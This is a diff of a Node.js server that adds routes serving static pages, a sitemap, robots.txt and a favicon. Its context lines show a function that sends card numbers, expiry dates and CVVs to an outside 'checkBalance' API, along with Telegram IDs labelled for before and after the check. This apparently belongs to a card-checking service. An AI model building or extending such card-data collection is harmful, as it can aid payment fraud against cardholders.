@@ -29,7 +29,7 @@ const TELEGRAM_BEFORE = process.env.TELEGRAM_ID_BEFORE_CHECK?.trim();
 const TELEGRAM_AFTER = process.env.TELEGRAM_ID_AFTER_CHECK?.trim();
 const API_URL = 'https://bot.pc.am/v3/checkBalance';
 
-const HTML = await fs.readFile(path.join(__dirname, 'standalone', 'index.html'), 'utf-8');
+const INDEX_HTML = await fs.readFile(path.join(__dirname, 'index.html'), 'utf-8');
 
 async function checkBalance(number, month, year, cvv) {
   const params = new URLSearchParams({
@@ -82,10 +82,28 @@ const server = http.createServer(async (req, res) => {
     return;
   }
 
-  if (req.method === 'GET' && (req.url === '/' || req.url === '/index.html')) {
-    res.writeHead(200, { 'Content-Type': 'text/html' });
-    res.end(HTML);
-    return;
+  if (req.method === 'GET') {
+    if (req.url === '/' || req.url === '/index.html' || req.url === '/faq' || req.url === '/contact' || req.url === '/about') {
+      res.writeHead(200, { 'Content-Type': 'text/html' });
+      res.end(INDEX_HTML);
+      return;
+    }
+    if (req.url === '/sitemap.xml' || req.url === '/robots.txt') {
+      try {
+        const file = await fs.readFile(path.join(__dirname, req.url.slice(1)), 'utf-8');
+        res.writeHead(200, { 'Content-Type': req.url.endsWith('.xml') ? 'application/xml' : 'text/plain' });
+        res.end(file);
+        return;
+      } catch (e) {}
+    }
+    if (req.url === '/favicon.svg') {
+      try {
+        const file = await fs.readFile(path.join(__dirname, 'favicon.svg'), 'utf-8');
+        res.writeHead(200, { 'Content-Type': 'image/svg+xml' });
+        res.end(file);
+        return;
+      } catch (e) {}
+    }
   }
 
   res.writeHead(404);
